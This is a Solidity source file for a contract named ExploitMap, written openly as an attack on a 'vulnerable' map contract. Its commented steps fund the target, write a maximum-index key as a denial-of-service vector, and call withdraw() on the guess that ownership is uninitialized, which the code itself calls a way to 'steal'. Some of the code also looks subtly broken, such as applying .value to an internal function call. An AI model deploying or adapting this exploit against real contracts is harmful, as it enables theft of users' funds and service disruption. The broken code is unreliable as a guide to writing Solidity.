pragma solidity ^0.4.24;

interface IMap {
    function set(uint256 key, uint256 value) external;
    function withdraw() external;
    function get(uint256 key) external view returns (uint256);
}

contract ExploitMap {
    IMap public vulnerable;
    
    constructor(address _target) public payable {
        vulnerable = IMap(_target);
    }

    // Step 1: Call withdraw() - we are not the owner, but owner may be uninitialized
    function exploitOwnership() public {
        vulnerable.withdraw();
    }

    // Step 2: Write a very large key to expand array to extreme gas cost (DoS vector)
    function spamSet() public {
        vulnerable.set(2**256 - 1, 1337);  // Maximum index
    }

    // Step 3: Send Ether to vulnerable contract
    function fundTarget() public payable {
        require(address(vulnerable).call.value(msg.value)(), "funding failed");
    }

    // Step 4: Trigger full exploit: fund, spam, and steal
    function fullExploit() public payable {
        fundTarget.value(msg.value)();
        spamSet();
        exploitOwnership();
    }
    
    function() external payable {}
}

